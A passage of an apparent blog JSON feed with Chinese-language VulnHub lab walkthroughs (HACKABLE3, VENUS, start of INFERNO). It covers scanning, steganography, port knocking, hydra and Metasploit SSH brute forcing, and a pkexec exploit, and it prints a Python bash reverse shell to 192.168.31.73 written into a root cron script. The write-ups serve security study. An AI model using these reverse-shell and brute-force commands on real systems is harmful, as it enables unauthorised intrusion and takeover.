alt></p>\n<h3 id=\"权限不足不能查看这两个脚本的作用是什么只能进行猜测搜索自己的目\"><a class=\"markdownIt-Anchor\" href=\"#权限不足不能查看这两个脚本的作用是什么只能进行猜测搜索自己的目\">#</a> 权限不足，不能查看这两个脚本的作用是什么，只能进行猜测，搜索自己的目</h3>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-909.png\" alt></p>\n<p>录发现有一个 quiet 的文件夹里边有很多文件</p>\n<p>而所有的文件中的内容都是 quiet 的内容，需要把这个文件先删除，然后动态的<br>\n查看此文件夹下的内容是否增加<br>\n cat * | uniq<br>\nwatch -n1 ls</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-910.png\" alt></p>\n<p>经过一段时间之后发现 quiet 文件又都复原了，判断出来 write 就是些 quiet 文件<br>\n的，check 就是用来检查 quiet 文件是否存在的</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-911.png\" alt></p>\n<p>上传 linpeas 检查是否有更多的敏感信息，找到了一个 /rootcreds.txt 文件</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-912.png\" alt></p>\n<p>这个文件里边就是 root 的账户和密码，直接 su root 切换到 root 的账户</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-913.png\" alt></p>\n<p>à 成功拿到了 root 权限</p>\n<h3 id=\"定时任务中就是在不断的执行这两个脚本\"><a class=\"markdownIt-Anchor\" href=\"#定时任务中就是在不断的执行这两个脚本\">#</a> 定时任务中就是在不断的执行这两个脚本</h3>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-914.png\" alt></p>\n<p>check 的作用就是检查文件夹中的内容是否为空是的话就把 root 的密码写到根<br>\n目录下，write 的作用是遍历写 quiet</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-915.png\" alt></p>\n",
            "tags": [
                "VULNHUB 31-40"
            ]
        },
        {
            "id": "https://n1h1l157.github.io/2021/11/01/VULNHUB/135%20HACKABLE3/",
            "url": "https://n1h1l157.github.io/2021/11/01/VULNHUB/135%20HACKABLE3/",
            "title": "VULNHUB 35 HACKABLE3",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvaGFja2FibGUtaWlpLDcyMC8=\">https://www.vulnhub.com/entry/hackable-iii,720/</span><br>\n 教程链接地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDEwNzgzNi9hcnRpY2xlL2RldGFpbHMvMTE5NDExNDc1\">https://blog.csdn.net/weixin_44107836/article/details/119411475</span></p>\n<h3 id=\"001-确认攻击目标的财产信息\"><a class=\"markdownIt-Anchor\" href=\"#001-确认攻击目标的财产信息\">#</a> 001 确认攻击目标的财产信息</h3>\n<p>攻击机 kali： 1 92.168.31. 73<br>\n 靶机 HACKABLELL 3 ：桥接于 1 92.168.31.1 的网卡，ip 未知</p>\n<p>1 ）确定靶机 ip 地址<br>\n自动化识别同一网卡下的 ip 地址，并且过滤出提前已知的 MAC 地址，打印出所<br>\n有的机器的 ip 地址并扫描其端口，最后删除多余文件<br>\n sudo arp-scan -l &gt; 1.txt ; cat 1.txt | grep ‘a0’ &gt; 2.txt ; rm -f 1.txt ; cat 2.txt | awk ‘{print<br>\n$1}’ &gt; ip.txt; rm -f 2.txt; sudo nmap -PA -iL ip.txt;rm -f ip.txt</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-916.png\" alt></p>\n<p>à 靶机 ip：192.168.31. 47 、靶机开放端口 80 (22 被过滤)</p>\n<h3 id=\"002-信息收集steghide隐写加解密\"><a class=\"markdownIt-Anchor\" href=\"#002-信息收集steghide隐写加解密\">#</a> 002 信息收集，Steghide 隐写，加解密</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEu\">http://192.168.31.</span> 47 / 进行信息收集</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-917.png\" alt></p>\n<h3 id=\"查看网页源码发现提示需要尝试上次日记中使用过的端口碰撞技术来解锁\"><a class=\"markdownIt-Anchor\" href=\"#查看网页源码发现提示需要尝试上次日记中使用过的端口碰撞技术来解锁\">#</a> 查看网页源码，发现提示，需要尝试上次日记中使用过的端口碰撞技术来解锁</h3>\n<p>ssh 端口，并且告诉老板 approve.jpg，<span class=\"exturl\" data-url=\"aHR0cDovL3huLS1oYWNrYWJsZTMtdTc1bjFnd2o4MDBiMjJpOWlhcTM1Y2luMGE1ZzhhLmNvbQ==\">并且有一个公司域名 hackable3.com</span>，<br>\n此外还有一个用户名 jubiscleudo。</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-918.png\" alt></p>\n<p>修改本地 hosts 文件，将 hackable3.com 解析到靶机 ip，<span class=\"exturl\" data-url=\"aHR0cDovL3huLS1oYWNrYWJsZTMtOXExcnE2MGEuY29t\">打开 hackable3.com</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-919.png\" alt></p>\n<h3 id=\"对网站进行目录扫描\"><a class=\"markdownIt-Anchor\" href=\"#对网站进行目录扫描\">#</a> 对网站进行目录扫描</h3>\n<p>gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory-<br>\nlist-2.3-medium.txt -u <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNDc=\">http://192.168.31.47</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-920.png\" alt></p>\n<h3 id=\"依次对爆破得到的目录进行访问\"><a class=\"markdownIt-Anchor\" href=\"#依次对爆破得到的目录进行访问\">#</a> 依次对爆破得到的目录进行访问</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL2hhY2thYmxlMy5jb20vbG9naW4ucGhw\">http://hackable3.com/login.php</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-921.png\" alt></p>\n<h3 id=\"此页面没有敏感的信息泄漏出来\"><a class=\"markdownIt-Anchor\" href=\"#此页面没有敏感的信息泄漏出来\">#</a> 此页面没有敏感的信息泄漏出来</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL2hhY2thYmxlMy5jb20vMy5qcGc=\">http://hackable3.com/3.jpg</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-922.png\" alt></p>\n<p>这个 url 地址就很奇怪，可以试着将此图片下载下来进行解析一番</p>\n<p>wget <span class=\"exturl\" data-url=\"aHR0cDovL2hhY2thYmxlMy5jb20vMy5qcGc=\">http://hackable3.com/3.jpg</span> - q<br>\nsteghide extract -sf 3.jpg<br>\n 这里使用了文件隐写，Steghide 是一款开源的隐写术软件，它可以让你在一张<br>\n图片或者音频文件中隐藏你的秘密信息，而且不会注意到图片或音频文件发生了<br>\n任何的改变。而且，你的秘密文件已经隐藏在了原始图片或音频文件之中了。</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-923.png\" alt></p>\n<h3 id=\"爆出了一个-65535-的端口猜测是需要端口敲门的一个端口号\"><a class=\"markdownIt-Anchor\" href=\"#爆出了一个-65535-的端口猜测是需要端口敲门的一个端口号\">#</a> 爆出了一个 65535 的端口，猜测是需要端口敲门的一个端口号</h3>\n<p>继续访问其他的 url 地址，在下面这个网址中找到了 2 .txt 这个文件<br>\n<span class=\"exturl\" data-url=\"aHR0cDovL2hhY2thYmxlMy5jb20vMi50eHQ=\"> http://hackable3.com/2.txt</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-924.png\" alt></p>\n<p>有 brainfuck 加密的一段密文，用在线网址进行界面后发现了第二个数字 4444</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-925.png\" alt></p>\n<p>继续对未搜寻的目标网址进行信息收集，在下面这个地址找到了 1 .txt<br>\n<span class=\"exturl\" data-url=\"aHR0cDovL2hhY2thYmxlMy5jb20vY29uZmlnLzEudHh0\">http://hackable3.com/config/1.txt</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-926.png\" alt></p>\n<p>直接通过终端进行 base 64 解密，找到了第三个数字 10000</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-927.png\" alt></p>\n<h3 id=\"继续翻阅其他文件找寻更多的信息\"><a class=\"markdownIt-Anchor\" href=\"#继续翻阅其他文件找寻更多的信息\">#</a> 继续翻阅其他文件，找寻更多的信息</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL2hhY2thYmxlMy5jb20vY29uZmlnLnBocA==\">http://hackable3.com/config.php</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-928.png\" alt></p>\n<h3 id=\"找到了一些数据库的配置信息但是没有利用价值\"><a class=\"markdownIt-Anchor\" href=\"#找到了一些数据库的配置信息但是没有利用价值\">#</a> 找到了一些数据库的配置信息，但是没有利用价值</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL2hhY2thYmxlMy5jb20vYmFja3VwL3dvcmRsaXN0LnR4dA==\">http://hackable3.com/backup/wordlist.txt</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-929.png\" alt></p>\n<h3 id=\"找到一个可能是密码的一个清单\"><a class=\"markdownIt-Anchor\" href=\"#找到一个可能是密码的一个清单\">#</a> 找到一个可能是密码的一个清单</h3>\n<h3 id=\"至此信息收集工作完毕简单总结一下我们收集到的信息\"><a class=\"markdownIt-Anchor\" href=\"#至此信息收集工作完毕简单总结一下我们收集到的信息\">#</a> 至此信息收集工作完毕，简单总结一下我们收集到的信息</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL2hhY2thYmxlMy5jb20v\">http://hackable3.com/</span>--&gt; 疑似用户名 jubiscleudo<br>\n<span class=\"exturl\" data-url=\"aHR0cDovL2hhY2thYmxlMy5jb20vYmFja3VwL3dvcmRsaXN0LnR4dA==\">http://hackable3.com/backup/wordlist.txt</span> --&gt; 疑似密码清单<br>\n<span class=\"exturl\" data-url=\"aHR0cDovL2hhY2thYmxlMy5jb20vY29uZmlnLzEudHh0\"> http://hackable3.com/config/1.txt</span> --&gt; 10000<br>\n<span class=\"exturl\" data-url=\"aHR0cDovL2hhY2thYmxlMy5jb20vY3NzLzIudHh0\">http://hackable3.com/css/2.txt</span> --&gt; 4444<br>\n<span class=\"exturl\" data-url=\"aHR0cDovL2hhY2thYmxlMy5jb20vMy5qcGc=\">http://hackable3.com/3.jpg</span> --&gt; steghide extract -sf 3.jpg --&gt; 65535</p>\n<h3 id=\"003-shell脚本端口敲门hydramsf爆破ssh\"><a class=\"markdownIt-Anchor\" href=\"#003-shell脚本端口敲门hydramsf爆破ssh\">#</a> 003 shell 脚本端口敲门，hydra/msf 爆破 ssh</h3>\n<p>knockd 服务：即敲门端口服务，该服务通过动态的添加 iptables 规则来隐藏系<br>\n统开启的服务，使用自定义的一系列序列号来 “敲门”，使系统开启需要访问的<br>\n服务端口，才能对外访问，不使用时，再使用自定义序列号来 “关门”，将端口<br>\n关闭，不对外监听。进一步提升了服务和系统的安全性，它的默认配置文件是：<br>\n/etc/knockd.conf</p>\n<h3 id=\"再次检查-22-端口确定是被过滤掉的\"><a class=\"markdownIt-Anchor\" href=\"#再次检查-22-端口确定是被过滤掉的\">#</a> 再次检查 22 端口确定是被过滤掉的</h3>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-930.png\" alt></p>\n<p>尝试用 nmap 依次去访问信息搜集出来的三个端口进行端口敲门<br>\n sudo nmap -p 4444,10000,65535 -A 192.168.31.223</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-931.png\" alt></p>\n<h3 id=\"端口敲门失败了可能是防火墙规则有一定的限制比如两个端口之间的敲门\"><a class=\"markdownIt-Anchor\" href=\"#端口敲门失败了可能是防火墙规则有一定的限制比如两个端口之间的敲门\">#</a> 端口敲门失败了，可能是防火墙规则有一定的限制，比如两个端口之间的敲门</h3>\n<h3 id=\"间隔两个端口之间的敲门顺序等\"><a class=\"markdownIt-Anchor\" href=\"#间隔两个端口之间的敲门顺序等\">#</a> 间隔，两个端口之间的敲门顺序等</h3>\n<p>利用 shell 命令进行批量端口敲门<br>\n for i in 10000,4444,65535;do sudo nmap -p $i 192.168.31.48;done</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-932.png\" alt></p>\n<h3 id=\"这种方法依次对三个端口进行敲门不分前后顺序所以敲门依旧失败了\"><a class=\"markdownIt-Anchor\" href=\"#这种方法依次对三个端口进行敲门不分前后顺序所以敲门依旧失败了\">#</a> 这种方法依次对三个端口进行敲门，不分前后顺序，所以敲门依旧失败了</h3>\n<h3 id=\"将逗号去掉依次对三个端口进行敲门\"><a class=\"markdownIt-Anchor\" href=\"#将逗号去掉依次对三个端口进行敲门\">#</a> 将逗号去掉，依次对三个端口进行敲门</h3>\n<p>for i in 10000 4444 65535;do sudo nmap -p $i 192.168.31.48;done</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-933.png\" alt></p>\n<p>端口敲门成功后，就可以用字典进行爆破 ssh 协议了<br>\n用户名就用我们信息收集阶段收集到的敏感用户名 jubiscleudo，密码选取在<br>\n网站上看到的疑似密码的文件<br>\n wget <span class=\"exturl\" data-url=\"aHR0cDovL2hhY2thYmxlMy5jb20vYmFja3VwL3dvcmRsaXN0LnR4dA==\">http://hackable3.com/backup/wordlist.txt</span> - O passwd.txt</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-934.png\" alt></p>\n<p>使用 hydra 尝试 ssh 的爆破<br>\n hydra -l jubiscleudo -P wordlist.txt ssh://192.168.31.48 -t 4 -f -I -vV -o hydra.ssh</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-935.png\" alt><br>\n<img data-src=\"/N1h1l157/VULNHUB/image-936.png\" alt></p>\n<p>爆破成功，拿到了 jubiscleudo 用户的密码为 onlymy</p>\n<p>也可以用 msfconsole 进行 ssh 的爆破<br>\n msfconsole<br>\nuse scanner/ssh/ssh_login<br>\nset rhosts 192.168.31.48<br>\nset STOP_ON_SUCCESS yes<br>\nset THREADS 4<br>\nset VERBOSE true<br>\nset PASS_FILE /home/parallels/Desktop/tool/hackable3/wordlist.txt<br>\nset USERNAME jubiscleudo<br>\nrun<br>\n 使用 msfconsole 的方法设置上边的参数，如使用 ssh_login 的模块，设置攻击<br>\n ip，爆破成功后的行为，线程，日志，密码清单，密码用户等；可以通过<br>\n options 选项查看该设置哪些参数</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-937.png\" alt></p>\n<p>设置好参数之后通过 run 命令开始执行 payload</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-938.png\" alt><br>\n<img data-src=\"/N1h1l157/VULNHUB/image-939.png\" alt></p>\n<p>爆破成功之后爆出来了用户名和密码 jubiscleudo:onlymy</p>\n<h3 id=\"004-数据库备份文件pspy-64-s监控定时任务提权\"><a class=\"markdownIt-Anchor\" href=\"#004-数据库备份文件pspy-64-s监控定时任务提权\">#</a> 004 数据库备份文件，pspy 64 s 监控，定时任务提权</h3>\n<h3 id=\"登陆服务器开始进一步的渗透测试\"><a class=\"markdownIt-Anchor\" href=\"#登陆服务器开始进一步的渗透测试\">#</a> 登陆服务器开始进一步的渗透测试</h3>\n<p>ssh 192.168.31.48 -l jubiscleudo</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-940.png\" alt></p>\n<p>对服务器的版本，SUID，pkexec，id 组，sudo，cron 检测后没有发现敏感文件<br>\n寻找服务器上是否有敏感的遗留文件，在网站主目录下找到一个备份文件</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-941.png\" alt></p>\n<h3 id=\"在此文件中看到了数据库的用户名和密码\"><a class=\"markdownIt-Anchor\" href=\"#在此文件中看到了数据库的用户名和密码\">#</a> 在此文件中看到了数据库的用户名和密码</h3>\n<p>(‘DB_USERNAME’, ‘hackable_3’);<br>\n(‘DB_PASSWORD’, ‘TrOLLED_3’);</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-942.png\" alt></p>\n<p>用 mysql 尝试登陆时却登陆失败了，那么这个用户名的意义何在？<br>\n查看一下此系统中存在哪些用户，发现就是有一个 hackable_3 的用户</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-943.png\" alt></p>\n<p>直接切换到 hackable_3 用户成功，看到 id 组属于 lxd，可以 lxd 提权，</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-944.png\" alt></p>\n<p>这里我们用其他方式提权，给靶机上下载一个 pspy 64 s 的监控，看定时任务</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-945.png\" alt></p>\n<p>靶机上接受到 pspy 64 s 后，配置可执行权限开始跑程序</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-946.png\" alt></p>\n<p>有一个 python 脚本定时被执行</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-947.png\" alt></p>\n<p>没法去查看此文件，直接通过 cat 写反弹 shell 的脚本<br>\n cat &gt; /scripts/to_hackable_3.py &lt;&lt; EOF<br>\nimport os<br>\nos.system(&quot;bash -c ‘bash -i &gt;&amp; /dev/tcp/192.168.31.73/4444 0&gt;&amp;1’ &quot;)<br>\nEOF</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-948.png\" alt></p>\n<p>监听端口，py 被执行后，成功拿到 root 权限</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-949.png\" alt></p>\n",
            "tags": [
                "VULNHUB 31-40"
            ]
        },
        {
            "id": "https://n1h1l157.github.io/2021/11/01/VULNHUB/137%20VENUS/",
            "url": "https://n1h1l157.github.io/2021/11/01/VULNHUB/137%20VENUS/",
            "title": "VULNHUB 37 VENUS",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvdGhlLXBsYW5ldHMtdmVudXMsNzA1Lw==\">https://www.vulnhub.com/entry/the-planets-venus,705/</span><br>\n 教程链接地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jb3B5ZnV0dXJlLmNvbS9ibG9ncy1kZXRhaWxzLzIwMjIwNjI1MTkxMjQ4NzgyNw==\">https://copyfuture.com/blogs-details/202206251912487827</span></p>\n<h3 id=\"001-确认攻击目标的财产信息\"><a class=\"markdownIt-Anchor\" href=\"#001-确认攻击目标的财产信息\">#</a> 001 确认攻击目标的财产信息</h3>\n<p>攻击机 kali： 1 92.168.31. 73<br>\n 靶机 VENUS：桥接于 1 92.168.31.1 的网卡，ip 未知</p>\n<p>1 ）确定靶机 ip 地址和开放的端口<br>\n sudo arp-scan -l &gt; 1.txt ; cat 1.txt | grep ‘a0’ &gt; 2.txt ; rm -f 1.txt ; cat 2.txt | awk ‘{print<br>\n$1}’ &gt; ip.txt; rm -f 2.txt; sudo nmap -PA -iL ip.txt;rm -f ip.txt</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-991.png\" alt></p>\n<p>à 靶机 ip：192.168.31. 12 、靶机开放端口 22 , 8080</p>\n<h3 id=\"002-信息收集页面存储cookiebase-64-解密\"><a class=\"markdownIt-Anchor\" href=\"#002-信息收集页面存储cookiebase-64-解密\">#</a> 002 信息收集，页面存储 cookie，base 64 解密</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTI6ODA4MC8=\">http://192.168.31.12:8080/</span> 进行信息收集</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-992.png\" alt></p>\n<p>给出了 guest:guest 的账户和密码，直接进入该网站</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-993.png\" alt></p>\n<p>查看了一下，翻了翻源代码没有发现敏感信息，用 gobuster 进行爆破<br>\n gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory-<br>\nlist-2.3-medium.txt -u <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTI6ODA4MC8=\">http://192.168.31.12:8080/</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-994.png\" alt></p>\n<p>进入 admin 页面，检查页面是否存储 cookies 信息</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-995.png\" alt></p>\n<p>将 auth 认证信息解密出来后发现是 guest:thrfg</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-996.png\" alt></p>\n<p>意味着我们登陆 guest 用户，页面就会存储 guest 用户的相关票据，但是凭借此<br>\n用户密码是无法登陆到网站后台的</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-997.png\" alt></p>\n<p>是不是有可能还有其他的登陆用户，我们将 google 存储在此页面的 cookie 信息<br>\n清除，重新回到登陆页面</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-998.png\" alt></p>\n<h3 id=\"下一步的目标转化为爆破此页面的用户名和密码\"><a class=\"markdownIt-Anchor\" href=\"#下一步的目标转化为爆破此页面的用户名和密码\">#</a> 下一步的目标转化为爆破此页面的用户名和密码</h3>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-999.png\" alt></p>\n<h3 id=\"但是如果没有什么规律的话-1000-行大小的字典爆破需要-1-0001000次的爆\"><a class=\"markdownIt-Anchor\" href=\"#但是如果没有什么规律的话-1000-行大小的字典爆破需要-1-0001000次的爆\">#</a> 但是如果没有什么规律的话， 1000 行大小的字典爆破，需要 1 000*1000 次的爆</h3>\n<h3 id=\"破次数因为用户名和密码都有可能是这-1000-个种的任意一个\"><a class=\"markdownIt-Anchor\" href=\"#破次数因为用户名和密码都有可能是这-1000-个种的任意一个\">#</a> 破次数，因为用户名和密码都有可能是这 1000 个种的任意一个</h3>\n<h3 id=\"003-burphydra爆破网站用户名vim使用技巧\"><a class=\"markdownIt-Anchor\" href=\"#003-burphydra爆破网站用户名vim使用技巧\">#</a> 003 burp/hydra 爆破网站用户名，vim 使用技巧</h3>\n<p>输入一个错误的用户名看页面回显，看到了 Invalid username 的信息，于是乎<br>\n我们可以先随便写一个密码，先爆破出用户名有哪些，有的话在依据此用户名<br>\n爆破其密码</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1000.png\" alt></p>\n<h3 id=\"顺便测一下输入正确的用户名错误的密码的时候页面的回显结果-发现有\"><a class=\"markdownIt-Anchor\" href=\"#顺便测一下输入正确的用户名错误的密码的时候页面的回显结果-发现有\">#</a> 顺便测一下输入正确的用户名，错误的密码的时候，页面的回显结果。发现有</h3>\n<p>Invalid password 的字段，可以据此信息判断页面是否能登陆成功。</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1001.png\" alt></p>\n<p>现在我们就通过爆破用户名的方式进入该网站，可以通过 burp 和 hydra 进行爆<br>\n破。采用 burp 的方式需要先将浏览器数据进行代理。</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1002.png\" alt></p>\n<h3 id=\"将用户名设置为变量密码设置为固定值进行爆破由于默认给出的账户名和\"><a class=\"markdownIt-Anchor\" href=\"#将用户名设置为变量密码设置为固定值进行爆破由于默认给出的账户名和\">#</a> 将用户名设置为变量，密码设置为固定值进行爆破，由于默认给出的账户名和</h3>\n<p>密码都是 guest 是一样的，这里我就直接通过将 username 和 password 的字段设<br>\n置为一致来爆破。</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1003.png\" alt></p>\n<h3 id=\"选取合适的字典如下开始爆破\"><a class=\"markdownIt-Anchor\" href=\"#选取合适的字典如下开始爆破\">#</a> 选取合适的字典如下，开始爆破</h3>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1004.png\" alt></p>\n<p>爆破成功后得到了 venus 用户是该网站的用户。</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1005.png\" alt></p>\n<p>接下来应该将 venus 作为固定用户名，测试其密码为多少。</p>\n<p>或者用 hydra 的方式爆破用户名和密码<br>\n hydra -L /usr/share/wordlists/rockyou.txt -p pass -s 8080 192.168.31.12 http-post-<br>\nform “/:username=<sup>USER</sup>&amp;password<sup>PASS</sup>:Invalid username.”</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1006.png\" alt></p>\n<p>测试得到了三个用户分别是 guest，venus，magellan</p>\n<p>爆破用户名的阶段是比较漫长的，虽然可以用 hydra 的 - t 参数指定最大线程为<br>\n 64 ，但是还是需要很长时间才能爆破出三个用户名的，这里为了尽快达到效<br>\n果，我用了 vim 将字典进行了修改。</p>\n<p>删除从第 3 行到第 5 行 按 ESC，然后输入下面的命令，然后回车 :3,5d<br>\n 删除当前行之前的所有行 按 ESC，然后输入下面的命令，然后回车 :1,.-1d<br>\n 删除当前行之后的所有行 按 ESC，然后输入下面的命令，然后回车 :.+1,$d</p>\n<h3 id=\"004-burp使用凯撒加密pkexec提权\"><a class=\"markdownIt-Anchor\" href=\"#004-burp使用凯撒加密pkexec提权\">#</a> 004 burp 使用，凯撒加密，pkexec 提权</h3>\n<p>单单依据上面的思路继续下去，需要对三个用户分别进行爆破，guest 和 venus<br>\n 比较好爆破，经过一段时间的爆破发现这两个用户名的密码就是其用户名。但<br>\n如果这个密码是比较复杂的也是很难爆破出来的。</p>\n<p>登陆 guest:guest，拦截浏览器数据，发现页面自动存储了 cookie 的信息。解密<br>\n之后为 guest:thrfg, 前者是用户名，后者并不是密码，但可能是密码的另一种加<br>\n密方式。</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1007.png\" alt></p>\n<p>登陆 venus:venus，拦截浏览器数据，找到 cookie，解密后的凭据为 venus:irahf</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1008.png\" alt></p>\n<p>我们继续清除浏览器存储的 cookie 信息，用正确的用户名和一个虚假的密码尝<br>\n试登陆，并用 burp 做代理拦截流量，发现页面给我们回复了一个加密密文。解<br>\n密后得到了 magellan:irahfvnatrbybtl1989</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1009.png\" alt></p>\n<h3 id=\"综上我们得到了三组数据分别是\"><a class=\"markdownIt-Anchor\" href=\"#综上我们得到了三组数据分别是\">#</a> 综上，我们得到了三组数据，分别是</h3>\n<p>guest:thrfg<br>\nvenus:irahf<br>\nmagellan:irahfvnatrbybtl1989</p>\n<p>观察得知，好像就是一个字符的偏移加密，这就是凯撒加密无疑了，但是具体<br>\n偏移多少位还需要一一尝试，在下面网址中依次按不同的偏移量进行解密<br>\n<span class=\"exturl\" data-url=\"aHR0cDovL21vZXJzaW1hLjAwY2hhLm5ldC9rYWlzYW1pbWEuYXNw\"> http://moersima.00cha.net/kaisamima.asp</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1010.png\" alt></p>\n<h3 id=\"最终得到了加密方式为凯撒偏移-13-的加密并且三位用户名密码均得到了\"><a class=\"markdownIt-Anchor\" href=\"#最终得到了加密方式为凯撒偏移-13-的加密并且三位用户名密码均得到了\">#</a> 最终得到了加密方式为凯撒偏移 13 的加密，并且三位用户名密码均得到了。</h3>\n<p>ssh 成功拿到了 magellan 的权限，得到了其 shell<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-1011.png\" alt></p>\n<p>看了一眼服务器存在 pkexec 的，并且有 s 权限，而且对方服务器也是有 gcc 编<br>\n译器的，直接利用此进行提权</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1012.png\" alt></p>\n<p>将 pkexec 的利用脚本发送至对方服务器，编译运行</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1013.png\" alt></p>\n<p>à <strong>成功拿到了 root 权限</strong></p>\n",
            "tags": [
                "VULNHUB 31-40"
            ]
        },
        {
            "id": "https://n1h1l157.github.io/2021/11/01/VULNHUB/139%20INFERNO/",
            "url": "https://n1h1l157.github.io/2021/11/01/VULNHUB/139%20INFERNO/",
            "title": "VULNHUB 39 INFERNO",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvaW5mZXJuby0xMSw2MDMv\">https://www.vulnhub.com/entry/inferno-11,603/</span><br>\n 教程链接地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDY4ODA1MC9hcnRpY2xlL2RldGFpbHMvMTE5OTAyNzM=\">https://blog.csdn.net/weixin_50688050/article/details/11990273</span> 5</p>\n<h3 id=\"001-确认攻击目标的财产信息\"><a class=\"markdownIt-Anchor\" href=\"#001-确认攻击目标的财产信息\">#</a> 001 确认攻击目标的财产信息</h3>\n<p>攻击机 kali： 1 92.168.31. 78<br>\n 靶机 VENUS：桥接于 1 92.168.31.1 的网卡，ip 未知</p>\n<p>1 ）确定靶机 ip 地址和开放的端口<br>\n由已至内网靶机所在主机 MAC 地址自动扫描靶机服务<br>\n sudo arp-scan -l | grep ‘a0’ | awk ‘{print $1,$2}’ | cut -d ’ ’ -f 1 | xargs sudo nmap -PA</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1066.png\" alt></p>\n<p>à 靶机 ip：192.168.31. 25 、靶机开放端口 22 , 80</p>\n<h3 id=\"002-信息收集hydra爆破网站密码上传php木马\"><a class=\"markdownIt-Anchor\" href=\"#002-信息收集hydra爆破网站密码上传php木马\">#</a> 002 信息收集，hydra 爆破网站密码，上传 php 木马</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEu\">http://192.168.31.</span> 25 / 进行信息收集</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1067.png\" alt></p>\n<h3 id=\"直接借助工具来一波目录扫描\"><a class=\"markdownIt-Anchor\" href=\"#直接借助工具来一波目录扫描\">#</a> 直接借助工具来一波目录扫描</h3>\n<p>gobuster dir -x php,txt,html,zip,rar,jpg,png 